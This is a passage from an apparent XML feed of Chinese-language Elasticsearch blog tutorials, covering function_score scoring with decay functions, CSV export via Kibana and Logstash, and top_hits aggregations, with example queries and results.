fields我们可以参考Elastic的官方文档来帮我们更深入地了解。Function score 查询function_score允许您修改查询检索的文档分数。 例如，如果分数函数在计算上很昂贵，并且足以在过滤后的文档集上计算分数，则此功能很有用。要使用function_score，用户必须定义一个查询和一个或多个函数，这些函数为查询返回的每个文档计算一个新分数。function_score可以只与一个函数一起使用，比如：12345678910111213GET /_search&#123; &quot;query&quot;: &#123; &quot;function_score&quot;: &#123; &quot;query&quot;: &#123; &quot;match_all&quot;: &#123;&#125; &#125;, &quot;boost&quot;: &quot;5&quot;, &quot;random_score&quot;: &#123;&#125;, &quot;boost_mode&quot;: &quot;multiply&quot; &#125; &#125;&#125;这里它把所有的文档的分数由5和一个由random_score (返回0到1之间的值)相乘而得到。那么这个分数就是一个从0到5之间的一个数值：12345678910111213141516171819202122232425262728&quot;hits&quot; : [ &#123; &quot;_index&quot; : &quot;chicago_employees&quot;, &quot;_type&quot; : &quot;_doc&quot;, &quot;_id&quot; : &quot;Hrz0_W4BDM8YqwyDD06A&quot;, &quot;_score&quot; : 4.9999876, &quot;_source&quot; : &#123; &quot;Name&quot; : &quot;ADKINS, WILLIAM J&quot;, &quot;Job Titles&quot; : &quot;SUPERVISING FIRE COMMUNICATIONS OPERATOR&quot;, &quot;Department&quot; : &quot;OEMC&quot;, &quot;Full or Part-Time&quot; : &quot;F&quot;, &quot;Salary or Hourly&quot; : &quot;Salary&quot;, &quot;Annual Salary&quot; : 121472.04 &#125; &#125;, &#123; &quot;_index&quot; : &quot;kibana_sample_data_logs&quot;, &quot;_type&quot; : &quot;_doc&quot;, &quot;_id&quot; : &quot;eXNIHm8BjrINWI3xYF0J&quot;, &quot;_score&quot; : 4.9999495, &quot;_source&quot; : &#123; &quot;agent&quot; : &quot;Mozilla/5.0 (X11; Linux i686) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.50 Safari/534.24&quot;, &quot;bytes&quot; : 6630, &quot;clientip&quot; : &quot;77.5.51.49&quot;, &quot;extension&quot; : &quot;&quot;, &quot;geo&quot; : &#123; &quot;srcdest&quot; : &quot;CN:ID&quot;, ...尽管这个分数没有多大实际的意思，但是它可以让我们每次进入一个网页看到不同的文档，而不是严格按照固定的匹配而得到的固定的结果。我们也可以配合soft_score一起来使用function_score：1234567891011121314151617181920GET best_games/_search&#123; &quot;_source&quot;: [ &quot;name&quot;, &quot;critic_score&quot;, &quot;user_score&quot; ], &quot;query&quot;: &#123; &quot;function_score&quot;: &#123; &quot;query&quot;: &#123; &quot;match&quot;: &#123; &quot;name&quot;: &quot;Final Fantasy&quot; &#125; &#125;, &quot;script_score&quot;: &#123; &quot;script&quot;: &quot;_score * (doc[&apos;user_score&apos;].value*10+doc[&apos;critic_score&apos;].value)/2/100&quot; &#125; &#125; &#125;&#125;那么显示的结果是：12345678910111213141516171819202122232425262728293031323334353637383940414243444546&quot;hits&quot; : [ &#123; &quot;_index&quot; : &quot;best_games&quot;, &quot;_type&quot; : &quot;_doc&quot;, &quot;_id&quot; : &quot;2qccJ28BCSSrjaXdSOnC&quot;, &quot;_score&quot; : 60.272747, &quot;_source&quot; : &#123; &quot;user_score&quot; : 9, &quot;critic_score&quot; : 92, &quot;name&quot; : &quot;Final Fantasy VII&quot; &#125; &#125;, &#123; &quot;_index&quot; : &quot;best_games&quot;, &quot;_type&quot; : &quot;_doc&quot;, &quot;_id&quot; : &quot;K6ccJ28BCSSrjaXdSOrC&quot;, &quot;_score&quot; : 57.623398, &quot;_source&quot; : &#123; &quot;user_score&quot; : 8, &quot;critic_score&quot; : 94, &quot;name&quot; : &quot;Final Fantasy IX&quot; &#125; &#125;, &#123; &quot;_index&quot; : &quot;best_games&quot;, &quot;_type&quot; : &quot;_doc&quot;, &quot;_id&quot; : &quot;6KccJ28BCSSrjaXdSOnC&quot;, &quot;_score&quot; : 56.96106, &quot;_source&quot; : &#123; &quot;user_score&quot; : 8, &quot;critic_score&quot; : 92, &quot;name&quot; : &quot;Final Fantasy X&quot; &#125; &#125;, &#123; &quot;_index&quot; : &quot;best_games&quot;, &quot;_type&quot; : &quot;_doc&quot;, &quot;_id&quot; : &quot;6qccJ28BCSSrjaXdSOnC&quot;, &quot;_score&quot; : 56.29872, &quot;_source&quot; : &#123; &quot;user_score&quot; : 8, &quot;critic_score&quot; : 90, &quot;name&quot; : &quot;Final Fantasy VIII&quot; &#125; &#125;, ...细心的读者可能看出来了。我们的分数和之前的那个soft_score结果是不一样的，但是我们搜索的结果的排序是一样的。在上面的script的写法中，我们使用了硬编码，也就是把10硬写入到script中了。假如有一种情况，我将来想修改这个值为20或其它的值，重新看看查询的结果。由于script的改变，需要重新进行编译，这样的效率并不高。一种较好的办法是如下的写法：1234567891011121314151617181920212223GET best_games/_search&#123; &quot;_source&quot;: [ &quot;name&quot;, &quot;critic_score&quot;, &quot;user_score&quot; ], &quot;query&quot;: &#123; &quot;script_score&quot;: &#123; &quot;query&quot;: &#123; &quot;match&quot;: &#123; &quot;name&quot;: &quot;Final Fantasy&quot; &#125; &#125;, &quot;script&quot;: &#123; &quot;params&quot;:&#123; &quot;multiplier&quot;: 10 &#125;, &quot;source&quot;: &quot;_score * (doc[&apos;user_score&apos;].value*params.multiplier+doc[&apos;critic_score&apos;].value)/2/100&quot; &#125; &#125; &#125;&#125;脚本编译被缓存以加快执行速度。 如果脚本具有需要考虑的参数，则最好重用相同的脚本并为其提供参数。boost_modeboost_mode是用来定义最新计算出来的分数如何和查询的分数来相结合的。mulitply 查询分数和功能分数相乘（默认）replace 仅使用功能分数，查询分数将被忽略sum 查询分数和功能分数相加avg 平均值max 查询分数和功能分数的最大值min 查询分数和功能分数的最小值field_value_factorfield_value_factor函数使您可以使用文档中的字段来影响得分。 与使用script_score函数类似，但是它避免了脚本编写的开销。 如果用于多值字段，则在计算中仅使用该字段的第一个值。例如，假设您有一个用数字likes字段索引的文档，并希望通过该字段影响文档的得分，那么这样做的示例如下所示：12345678910111213GET /_search&#123; &quot;query&quot;: &#123; &quot;function_score&quot;: &#123; &quot;field_value_factor&quot;: &#123; &quot;field&quot;: &quot;likes&quot;, &quot;factor&quot;: 1.2, &quot;modifier&quot;: &quot;sqrt&quot;, &quot;missing&quot;: 1 &#125; &#125; &#125;&#125;上面的function_score将根据field_value_factore按照如下的方式来计算分数：sqrt(1.2 * doc[&#39;likes&#39;].value)field_value_factor函数有许多选项：field 要从文档中提取的字段。factor 字段值乘以的可选因子，默认为1。modifier 应用于字段值的修饰符可以是以下之一：none，log，log1p，log2p，ln，ln1p，ln2p，平方，sqrt或reciprocal。 默认为无。missing 如果文档没有该字段，则使用该值。 就像从文档中读取一样，修饰符和因数仍然适用于它。针对我们的例子，我们也可以使用如下的方法来重新计算分数：1234567891011121314151617181920212223GET best_games/_search&#123; &quot;_source&quot;: [ &quot;name&quot;, &quot;critic_score&quot;, &quot;user_score&quot; ], &quot;query&quot;: &#123; &quot;function_score&quot;: &#123; &quot;query&quot;: &#123; &quot;match&quot;: &#123; &quot;name&quot;: &quot;Final Fantasy&quot; &#125; &#125;, &quot;field_value_factor&quot;: &#123; &quot;field&quot;: &quot;user_score&quot;, &quot;factor&quot;: 1.2, &quot;modifier&quot;: &quot;none&quot;, &quot;missing&quot;: 1 &#125; &#125; &#125;&#125;在上面的例子里，我们使用user_score字段，并把这个字段的factor设置为1.2。这样加大这个字段的重要性。重新进行搜索：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647 &quot;hits&quot; : [ &#123; &quot;_index&quot; : &quot;best_games&quot;, &quot;_type&quot; : &quot;_doc&quot;, &quot;_id&quot; : &quot;2qccJ28BCSSrjaXdSOnC&quot;, &quot;_score&quot; : 87.89488, &quot;_source&quot; : &#123; &quot;user_score&quot; : 9, &quot;critic_score&quot; : 92, &quot;name&quot; : &quot;Final Fantasy VII&quot; &#125; &#125;, &#123; &quot;_index&quot; : &quot;best_games&quot;, &quot;_type&quot; : &quot;_doc&quot;, &quot;_id&quot; : &quot;6KccJ28BCSSrjaXdSOnC&quot;, &quot;_score&quot; : 78.128784, &quot;_source&quot; : &#123; &quot;user_score&quot; : 8, &quot;critic_score&quot; : 92, &quot;name&quot; : &quot;Final Fantasy X&quot; &#125; &#125;, &#123; &quot;_index&quot; : &quot;best_games&quot;, &quot;_type&quot; : &quot;_doc&quot;, &quot;_id&quot; : &quot;6qccJ28BCSSrjaXdSOnC&quot;, &quot;_score&quot; : 78.128784, &quot;_source&quot; : &#123; &quot;user_score&quot; : 8, &quot;critic_score&quot; : 90, &quot;name&quot; : &quot;Final Fantasy VIII&quot; &#125; &#125;, &#123; &quot;_index&quot; : &quot;best_games&quot;, &quot;_type&quot; : &quot;_doc&quot;, &quot;_id&quot; : &quot;K6ccJ28BCSSrjaXdSOrC&quot;, &quot;_score&quot; : 78.128784, &quot;_source&quot; : &#123; &quot;user_score&quot; : 8, &quot;critic_score&quot; : 94, &quot;name&quot; : &quot;Final Fantasy IX&quot; &#125; &#125;, ...我们可以看出来我们的分数又有些变化。而且排序也有变化。functions上面的例子中，每一个doc都会乘以相同的系数，有时候我们需要对不同的doc采用不同的权重。这时，使用functions是一种不错的选择。几个function可以组合。 在这种情况下，可以选择仅在文档与给定的过滤查询匹配时才应用该function:12345678910111213141516171819202122232425262728293031323334GET /_search&#123; &quot;query&quot;: &#123; &quot;function_score&quot;: &#123; &quot;query&quot;: &#123; &quot;match_all&quot;: &#123;&#125; &#125;, &quot;boost&quot;: &quot;5&quot;, &quot;functions&quot;: [ &#123; &quot;filter&quot;: &#123; &quot;match&quot;: &#123; &quot;test&quot;: &quot;bar&quot; &#125; &#125;, &quot;random_score&quot;: &#123;&#125;, &quot;weight&quot;: 23 &#125;, &#123; &quot;filter&quot;: &#123; &quot;match&quot;: &#123; &quot;test&quot;: &quot;cat&quot; &#125; &#125;, &quot;weight&quot;: 42 &#125; ], &quot;max_boost&quot;: 42, &quot;score_mode&quot;: &quot;max&quot;, &quot;boost_mode&quot;: &quot;multiply&quot;, &quot;min_score&quot;: 42 &#125; &#125;&#125;上面的boost为5，也即所有的文档的加权都是5。我们同时也看到几个定义的functions。它们是针对相应的匹配的文档分别进行加权的。如果匹配了，就可以乘以相应的加权。针对我们的例子，我们也可以做如下的实验。123456789101112131415161718192021222324GET best_games/_search&#123; &quot;query&quot;: &#123; &quot;function_score&quot;: &#123; &quot;query&quot;: &#123; &quot;match&quot;: &#123; &quot;name&quot;: &quot;Final Fantasy&quot; &#125; &#125;, &quot;boost&quot;: &quot;1&quot;, &quot;functions&quot;: [ &#123; &quot;filter&quot;: &#123; &quot;match&quot;: &#123; &quot;name&quot;: &quot; XIII&quot; &#125; &#125;, &quot;weight&quot;: 10000000 &#125; ], &quot;boost_mode&quot;: &quot;multiply&quot; &#125; &#125;&#125;我们想把name含有XIII的所有游戏都加一个权。这样它可以排到最前面。我们给它的加权值很大：10000000。搜索后的结果是：12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182 &quot;hits&quot; : [ &#123; &quot;_index&quot; : &quot;best_games&quot;, &quot;_type&quot; : &quot;_doc&quot;, &quot;_id&quot; : &quot;KqccJ28BCSSrjaXdSOrC&quot;, &quot;_score&quot; : 8.1384144E7, &quot;_source&quot; : &#123; &quot;global_sales&quot; : 5.33, &quot;year&quot; : 2009, &quot;image_url&quot; : &quot;https://www.wired.com/images_blogs/gamelife/2009/09/ffxiii-01.jpg&quot;, &quot;platform&quot; : &quot;PS3&quot;, &quot;@timestamp&quot; : &quot;2009-01-01T00:00:00.000+08:00&quot;, &quot;user_score&quot; : 7, &quot;critic_score&quot; : 83, &quot;name&quot; : &quot;Final Fantasy XIII&quot;, &quot;genre&quot; : &quot;Role-Playing&quot;, &quot;publisher&quot; : &quot;Square Enix&quot;, &quot;developer&quot; : &quot;Square Enix&quot;, &quot;id&quot; : &quot;final-fantasy-xiii-ps3-2009&quot; &#125; &#125;, &#123; &quot;_index&quot; : &quot;best_games&quot;, &quot;_type&quot; : &quot;_doc&quot;, &quot;_id&quot; : &quot;OKccJ28BCSSrjaXdSOvC&quot;, &quot;_score&quot; : 7.2601472E7, &quot;_source&quot; : &#123; &quot;global_sales&quot; : 2.63, &quot;year&quot; : 2011, &quot;image_url&quot; : &quot;https://i.ytimg.com/vi/tSJH_vhaYUk/maxresdefault.jpg&quot;, &quot;platform&quot; : &quot;PS3&quot;, &quot;@timestamp&quot; : &quot;2011-01-01T00:00:00.000+08:00&quot;, &quot;user_score&quot; : 6, &quot;critic_score&quot; : 79, &quot;name&quot; : &quot;Final Fantasy XIII-2&quot;, &quot;genre&quot; : &quot;Role-Playing&quot;, &quot;publisher&quot; : &quot;Square Enix&quot;, &quot;developer&quot; : &quot;Square Enix&quot;, &quot;id&quot; : &quot;final-fantasy-xiii-2-ps3-2011&quot; &#125; &#125;, &#123; &quot;_index&quot; : &quot;best_games&quot;, &quot;_type&quot; : &quot;_doc&quot;, &quot;_id&quot; : &quot;2qccJ28BCSSrjaXdSOnC&quot;, &quot;_score&quot; : 8.138414, &quot;_source&quot; : &#123; &quot;global_sales&quot; : 9.72, &quot;year&quot; : 1997, &quot;image_url&quot; : &quot;https://r.hswstatic.com/w_907/gif/finalfantasyvii-MAIN.jpg&quot;, &quot;platform&quot; : &quot;PS&quot;, &quot;@timestamp&quot; : &quot;1997-01-01T00:00:00.000+08:00&quot;, &quot;user_score&quot; : 9, &quot;critic_score&quot; : 92, &quot;name&quot; : &quot;Final Fantasy VII&quot;, &quot;genre&quot; : &quot;Role-Playing&quot;, &quot;publisher&quot; : &quot;Sony Computer Entertainment&quot;, &quot;developer&quot; : &quot;SquareSoft&quot;, &quot;id&quot; : &quot;final-fantasy-vii-ps-1997&quot; &#125; &#125;, &#123; &quot;_index&quot; : &quot;best_games&quot;, &quot;_type&quot; : &quot;_doc&quot;, &quot;_id&quot; : &quot;6KccJ28BCSSrjaXdSOnC&quot;, &quot;_score&quot; : 8.138414, &quot;_source&quot; : &#123; &quot;global_sales&quot; : 8.05, &quot;year&quot; : 2001, &quot;image_url&quot; : &quot;https://www.mobygames.com/images/promo/l/192477-final-fantasy-x-screenshot.jpg&quot;, &quot;platform&quot; : &quot;PS2&quot;, &quot;@timestamp&quot; : &quot;2001-01-01T00:00:00.000+08:00&quot;, &quot;user_score&quot; : 8, &quot;critic_score&quot; : 92, &quot;name&quot; : &quot;Final Fantasy X&quot;, &quot;genre&quot; : &quot;Role-Playing&quot;, &quot;publisher&quot; : &quot;Sony Computer Entertainment&quot;, &quot;developer&quot; : &quot;SquareSoft&quot;, &quot;id&quot; : &quot;final-fantasy-x-ps2-2001&quot; &#125; &#125;,...我们可以看出来，在这一次的搜索中Final Fantasy XIII的排名变成第一了。Elasticsearch中的衰变函数在Elasticsearch中，常见的Decay function （衰变函数）有一下的几种：Function评分技术不仅可以修改默认的Elasticsearch评分算法，还可以用于完全替代它。 一个很好的例子是“trending”搜索，显示主题中正在迅速流行的项目。这样的分数不能基于简单的指标（例如“喜欢”或“观看次数”），而必须根据当前时间不断调整。 与在24小时内获得10000次观看的视频相比，在1小时内获得1000次观看的视频通常被认为“更热”。 Elasticsearch附带了几个衰减函数，这些函数使解决此类问题变得轻而易举。我们现在以gauss来为例展示如何使用这个衰变函数的。曲线的形状可以通过orgin，scale，offset和decay来控制。 这三个变量是控制曲线形状的主要工具。 可以将origin和scale参数视为您的最小值和最大值，它定义了将在其中定义曲线的边界框。 如果我们希望趋势视频列表涵盖一整天，则最好将原点定义为当前时间戳，比例尺定义为24小时。 offset可用于在开始时将曲线完全平坦，例如将其设置为1h，可消除最近视频的所有惩罚，也即最近1个小时里的所有视频不受影响 。最后，衰减选项会根据文档的位置更改文档降级的严重程度。 默认的衰减值是0.5，较大的值会使曲线更陡峭，其效果也更明显。我们还是拿我们的best_games来为例：123456789101112131415161718192021222324252627282930GET best_games/_search&#123; &quot;_source&quot;: [ &quot;name&quot;, &quot;critic_score&quot;, &quot;user_score&quot; ], &quot;query&quot;: &#123; &quot;function_score&quot;: &#123; &quot;query&quot;: &#123; &quot;match&quot;: &#123; &quot;name&quot;: &quot;Final Fantasy&quot; &#125; &#125;, &quot;functions&quot;: [ &#123; &quot;gauss&quot;: &#123; &quot;@timestamp&quot;: &#123; &quot;origin&quot;: &quot;2016-01-01T00:00:00&quot;, &quot;scale&quot;: &quot;365d&quot;, &quot;offset&quot;: &quot;0h&quot;, &quot;decay&quot;: 0.1 &#125; &#125; &#125; ], &quot;boost_mode&quot;: &quot;multiply&quot; &#125; &#125;&#125;上面的查询是基于2016-010-01这一天开始，在365天之内的文档不收衰减，那么超过这个时间的所有文档，衰减的加权值为0.1。也就是说1年开外的所有文档对我的意义并不是太多。重新运行我们的查询，结果显示：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657 &quot;hits&quot; : [ &#123; &quot;_index&quot; : &quot;best_games&quot;, &quot;_type&quot; : &quot;_doc&quot;, &quot;_id&quot; : &quot;OKccJ28BCSSrjaXdSOvC&quot;, &quot;_score&quot; : 6.6742494E-25, &quot;_source&quot; : &#123; &quot;user_score&quot; : 6, &quot;critic_score&quot; : 79, &quot;name&quot; : &quot;Final Fantasy XIII-2&quot; &#125; &#125;, &#123; &quot;_index&quot; : &quot;best_games&quot;, &quot;_type&quot; : &quot;_doc&quot;, &quot;_id&quot; : &quot;2qccJ28BCSSrjaXdSOnC&quot;, &quot;_score&quot; : 0.0, &quot;_source&quot; : &#123; &quot;user_score&quot; : 9, &quot;critic_score&quot; : 92, &quot;name&quot; : &quot;Final Fantasy VII&quot; &#125; &#125;, &#123; &quot;_index&quot; : &quot;best_games&quot;, &quot;_type&quot; : &quot;_doc&quot;, &quot;_id&quot; : &quot;6KccJ28BCSSrjaXdSOnC&quot;, &quot;_score&quot; : 0.0, &quot;_source&quot; : &#123; &quot;user_score&quot; : 8, &quot;critic_score&quot; : 92, &quot;name&quot; : &quot;Final Fantasy X&quot; &#125; &#125;, &#123; &quot;_index&quot; : &quot;best_games&quot;, &quot;_type&quot; : &quot;_doc&quot;, &quot;_id&quot; : &quot;6qccJ28BCSSrjaXdSOnC&quot;, &quot;_score&quot; : 0.0, &quot;_source&quot; : &#123; &quot;user_score&quot; : 8, &quot;critic_score&quot; : 90, &quot;name&quot; : &quot;Final Fantasy VIII&quot; &#125; &#125;, &#123; &quot;_index&quot; : &quot;best_games&quot;, &quot;_type&quot; : &quot;_doc&quot;, &quot;_id&quot; : &quot;FqccJ28BCSSrjaXdSOrC&quot;, &quot;_score&quot; : 0.0, &quot;_source&quot; : &#123; &quot;user_score&quot; : 7, &quot;critic_score&quot; : 92, &quot;name&quot; : &quot;Final Fantasy XII&quot; &#125; &#125;,...这次的搜索结果显示Final Fantasy XIII-2是得分最高的文档。参考：【1】https://www.elastic.co/blog/found-function-scoring【2】https://medium.com/horrible-hacks/customizing-scores-in-elasticsearch-for-product-recommendations-9e0d02ce1dbd【3】https://www.elastic.co/guide/en/elasticsearch/reference/current/query-dsl-function-score-query.html#function-field-value-factor【4】https://juejin.im/post/5df8f465518825123751c089【5】https://www.elastic.co/guide/en/elasticsearch/reference/current/query-dsl-script-score-query.html]]></content>
      <categories>
        <category>elk</category>
      </categories>
      <tags>
        <tag>elk</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Elasticsearch：如何把Elasticsearch中的数据导出为CSV格式的文件]]></title>
    <url>%2F2020%2F01%2F02%2FElasticsearch%EF%BC%9A%E5%A6%82%E4%BD%95%E6%8A%8AElasticsearch%E4%B8%AD%E7%9A%84%E6%95%B0%E6%8D%AE%E5%AF%BC%E5%87%BA%E4%B8%BACSV%E6%A0%BC%E5%BC%8F%E7%9A%84%E6%96%87%E4%BB%B6%2F</url>
    <content type="text"><![CDATA[本教程向您展示如何将数据从Elasticsearch导出到CSV文件。 想象一下，您想要在Excel中打开一些Elasticsearch中的数据，并根据这些数据创建数据透视表。 这只是一个用例，其中将数据从Elasticsearch导出到CSV文件将很有用。方法一其实这种方法最简单了。我们可以直接使用Kibana中提供的功能实现这个需求。我们首先来准备数据：再接着选择Add data。这样我们的Elasticsearch中就会有我们的eCommerce索引了。我们接着选择Discover，并选择我们刚才建立的eCommerce索引。我们同时要记得在time picker里选择我们所需要的时间段：我们可以做一些我们想要的搜索：我们点击左上角的Save按钮：接下来，我们点击Share按钮：这样我们就可以得到我们当前搜索结果的csv文件。我们只需要在Kibana中下载即可：方法二我们可以使用Logstash提供的功能来做这个。这个的好处是可以通过编程的方式来进行。Logstash不只光可以把数据传上Elasticsearch，同时它还可以把数据从Elasticsearch中导出。我们首先必须安装和Elasticsearch相同版本的 Logstash。如果大家还不指定如安装Logstash的话，请参阅我的文章“如何安装Elastic栈中的Logstash”。我们可以进一步查看我们的Logstash是否支持csv的output:1./bin/logstash-plugin list --group output显示：123456789101112131415161718192021logstash-output-cloudwatchlogstash-output-csvlogstash-output-elastic_app_searchlogstash-output-elasticsearchlogstash-output-emaillogstash-output-filelogstash-output-graphitelogstash-output-httplogstash-output-lumberjacklogstash-output-nagioslogstash-output-nulllogstash-output-pipelogstash-output-rabbitmqlogstash-output-redislogstash-output-s3logstash-output-snslogstash-output-sqslogstash-output-stdoutlogstash-output-tcplogstash-output-udplogstash-output-webhdfs显然logstash-ouput-csv是在列表中。也就是说我们logstash支持csv格式的输出。我们建立如下的Logstash的配置文件：12345678910111213141516171819202122232425262728293031323334353637383940convert_csv.confinput &#123; elasticsearch &#123; hosts =&gt; &quot;localhost:9200&quot; index =&gt; &quot;kibana_sample_data_ecommerce&quot; query =&gt; &apos;&#123; &quot;query&quot;: &#123; &quot;bool&quot;: &#123; &quot;must&quot;: [ &#123; &quot;match&quot;: &#123; &quot;currency&quot;: &quot;EUR&quot; &#125; &#125;, &#123; &quot;match&quot;: &#123; &quot;products.quantity&quot;: 1 &#125; &#125; ] &#125; &#125; &#125;&apos; &#125;&#125; output &#123; csv &#123; # This is the fields that you would like to output in CSV format. # The field needs to be one of the fields shown in the output when you run your # Elasticsearch query fields =&gt; [&quot;category&quot;, &quot;customer_birth_date&quot;, &quot;customer_first_name&quot;, &quot;customer_full_name&quot;, &quot;day_of_week&quot;] # This is where we store output. We can use several files to store our output # by using a timestamp to determine the filename where to store output. path =&gt; &quot;/Users/liuxg/tmp/csv-export.csv&quot; &#125;&#125;请注意上面的path需要自己去定义时候自己环境的路径。这里我们在fields里定义了我们想要的字段。然后，我们可以运行我们的Logstash应用：1./bin/logstash -f ~/data/convert_csv.conf这样在我们定义的文件路径/Users/liuxg/tmp/csv-export.csv可以看到一个输出的csv文件。我们可以打开这个文件，并看到像这样的文档：]]></content>
      <categories>
        <category>elk</category>
      </categories>
      <tags>
        <tag>elk</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Elasticsearch：top_hits aggregation]]></title>
    <url>%2F2020%2F01%2F02%2FElasticsearch%EF%BC%9Atop_hits%20aggregation%2F</url>
    <content type="text"><![CDATA[top_hits指标聚合器跟踪要聚合的最相关文档。 该聚合器旨在用作子聚合器，以便可以按存储分区汇总最匹配的文档。top_hits聚合器可以有效地用于通过存储桶聚合器按某些字段对结果集进行分组。 一个或多个存储桶聚合器确定将结果集切成哪些属性。选项：from-要获取的第一个结果的偏移量。size-每个存储桶要返回的最匹配匹配项的最大数目。 默认情况下，返回前三个匹配项。排序-匹配的热门匹配的排序方式。 默认情况下，命中按主要查询的分数排序。我们还是来用一个例子来展示如何使用这个：准备数据：我们选用Kibana里带的官方的Sample web logs来作为我们的索引：然后加载我们的索引：这样我们的数据就加载完成了。Top hits aggregation首先，我们先做一个简单的基于hosts的aggregation:123456789101112GET kibana_sample_data_logs/_search&#123; &quot;size&quot;: 0, &quot;aggs&quot;: &#123; &quot;hosts&quot;: &#123; &quot;terms&quot;: &#123; &quot;field&quot;: &quot;host.keyword&quot;, &quot;size&quot;: 2 &#125; &#125; &#125;&#125;上面的搜索的结果是我们想得到2个桶的数据（这里为了说明问题的方便，设定为2）。而这两个桶是基于hosts的值。搜索的结果是：12345678910111213141516&quot;aggregations&quot; : &#123; &quot;hosts&quot; : &#123; &quot;doc_count_error_upper_bound&quot; : 0, &quot;sum_other_doc_count&quot; : 2807, &quot;buckets&quot; : [ &#123; &quot;key&quot; : &quot;artifacts.elastic.co&quot;, &quot;doc_count&quot; : 6488 &#125;, &#123; &quot;key&quot; : &quot;www.elastic.co&quot;, &quot;doc_count&quot; : 4779 &#125; ] &#125; &#125;现在的要求是：我们想针对这里的每个桶得到按照我们需要排序的前面的几个结果，比如下面的搜索：12345678910111213141516171819202122232425262728293031323334GET kibana_sample_data_logs/_search&#123; &quot;size&quot;: 0, &quot;aggs&quot;: &#123; &quot;hosts&quot;: &#123; &quot;terms&quot;: &#123; &quot;field&quot;: &quot;host.keyword&quot;, &quot;size&quot;: 2 &#125;, &quot;aggs&quot;: &#123; &quot;most_bytes&quot;: &#123; &quot;top_hits&quot;: &#123; &quot;sort&quot;: [ &#123; &quot;bytes&quot;: &#123; &quot;order&quot;: &quot;desc&quot; &#125; &#125; ], &quot;_source&quot;: &#123; &quot;includes&quot;: [ &quot;bytes&quot;, &quot;hosts&quot;, &quot;ip&quot;, &quot;clientip&quot; ] &#125;, &quot;size&quot;: 2 &#125; &#125; &#125; &#125; &#125;&#125;上面实际上市一个pipleline的聚合。它在针对上面的桶来做了一个top_hits的聚合。针对每个桶，我们需要安装bytes的大小，降序排列，并且每个桶只需要两个数据：12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394&quot;aggregations&quot; : &#123; &quot;hosts&quot; : &#123; &quot;doc_count_error_upper_bound&quot; : 0, &quot;sum_other_doc_count&quot; : 2807, &quot;buckets&quot; : [ &#123; &quot;key&quot; : &quot;artifacts.elastic.co&quot;, &quot;doc_count&quot; : 6488, &quot;most_bytes&quot; : &#123; &quot;hits&quot; : &#123; &quot;total&quot; : &#123; &quot;value&quot; : 6488, &quot;relation&quot; : &quot;eq&quot; &#125;, &quot;max_score&quot; : null, &quot;hits&quot; : [ &#123; &quot;_index&quot; : &quot;kibana_sample_data_logs&quot;, &quot;_type&quot; : &quot;_doc&quot;, &quot;_id&quot; : &quot;dnNIHm8BjrINWI3xXlRc&quot;, &quot;_score&quot; : null, &quot;_source&quot; : &#123; &quot;bytes&quot; : 19929, &quot;ip&quot; : &quot;127.155.255.9&quot;, &quot;clientip&quot; : &quot;127.155.255.9&quot; &#125;, &quot;sort&quot; : [ 19929 ] &#125;, &#123; &quot;_index&quot; : &quot;kibana_sample_data_logs&quot;, &quot;_type&quot; : &quot;_doc&quot;, &quot;_id&quot; : &quot;OXNIHm8BjrINWI3xX1td&quot;, &quot;_score&quot; : null, &quot;_source&quot; : &#123; &quot;bytes&quot; : 19904, &quot;ip&quot; : &quot;100.177.58.231&quot;, &quot;clientip&quot; : &quot;100.177.58.231&quot; &#125;, &quot;sort&quot; : [ 19904 ] &#125; ] &#125; &#125; &#125;, &#123; &quot;key&quot; : &quot;www.elastic.co&quot;, &quot;doc_count&quot; : 4779, &quot;most_bytes&quot; : &#123; &quot;hits&quot; : &#123; &quot;total&quot; : &#123; &quot;value&quot; : 4779, &quot;relation&quot; : &quot;eq&quot; &#125;, &quot;max_score&quot; : null, &quot;hits&quot; : [ &#123; &quot;_index&quot; : &quot;kibana_sample_data_logs&quot;, &quot;_type&quot; : &quot;_doc&quot;, &quot;_id&quot; : &quot;4nNIHm8BjrINWI3xYWQl&quot;, &quot;_score&quot; : null, &quot;_source&quot; : &#123; &quot;bytes&quot; : 19986, &quot;ip&quot; : &quot;233.204.30.48&quot;, &quot;clientip&quot; : &quot;233.204.30.48&quot; &#125;, &quot;sort&quot; : [ 19986 ] &#125;, &#123; &quot;_index&quot; : &quot;kibana_sample_data_logs&quot;, &quot;_type&quot; : &quot;_doc&quot;, &quot;_id&quot; : &quot;wnNIHm8BjrINWI3xW0Rj&quot;, &quot;_score&quot; : null, &quot;_source&quot; : &#123; &quot;bytes&quot; : 19956, &quot;ip&quot; : &quot;129.237.102.30&quot;, &quot;clientip&quot; : &quot;129.237.102.30&quot; &#125;, &quot;sort&quot; : [ 19956 ] &#125; ] &#125; &#125; &#125; ] &#125;&#125;从上面的返回结果可以看出来两个hosts artifacts.elastic.co及www.elastic.co各返回两个结果，并且它们是按照bytes的大小进行降序排列的。细心的读者可能会发现这个和我之前介绍的field collapsing有些类似。只是field collapsing里针对每个桶有一个结果，并且是按照我们的要求进行排序的最高结果的那个。当然我们也可以含有多几个返回结果在inner_hits之中。参考：【1】https://www.elastic.co/guide/en/elasticsearch/reference/current/search-aggregations-metrics-top-hits-aggregation.html]]></content>
      <categories>
        <category>elk</category>
      </categories>
      <tags>
        <tag>elk</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Elasticsearch：Smart Chinese Analysis plugin]]></title>
    <url>%2F2020%2F01%2F02%2FElasticsearch%EF%BC%9ASmart%20Chinese%20Analysis%20plugin%2F</url>
